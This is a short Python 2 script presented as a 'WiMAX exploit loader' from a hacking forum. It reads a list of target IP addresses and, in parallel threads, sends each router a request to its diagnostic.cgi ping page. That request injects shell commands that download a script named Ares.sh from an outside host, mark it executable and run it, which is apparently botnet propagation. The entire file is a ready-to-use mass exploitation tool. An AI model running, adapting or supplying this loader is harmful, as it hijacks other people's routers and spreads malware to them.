#!/usr/bin/env python
# -*- coding: utf-8 -*-
# WIMUX EXPLOIT LOADER MADE BY B4CKDOOR #
# B4CKDOORARCHIVE.CLUB [NEWDOMAIN] | JOIN DISCORD BY WEBSITE INVITE LINK #
import threading, sys, time, random, socket, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *

if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
    sys.exit()

ips = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) #PORTS 8080 80

class b4ckdoor(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "[WiMAX] Sending Payload - " + self.ip
				url = "http://" + self.ip + "/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q -s 0 127.0.0.1;wget http://1.3.3.7/Ares.sh; curl -O http://1.3.3.7/Ares.sh; chmod 777 Ares.sh; sh Ares.sh;&ping_count=1&action=Apply&html_view=ping"  
				requests.post(url, timeout=2) 

			except Exception as e:
				pass
for ip in ips:
	try:
		n = b4ckdoor(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass#CODED BY B4CKDOOR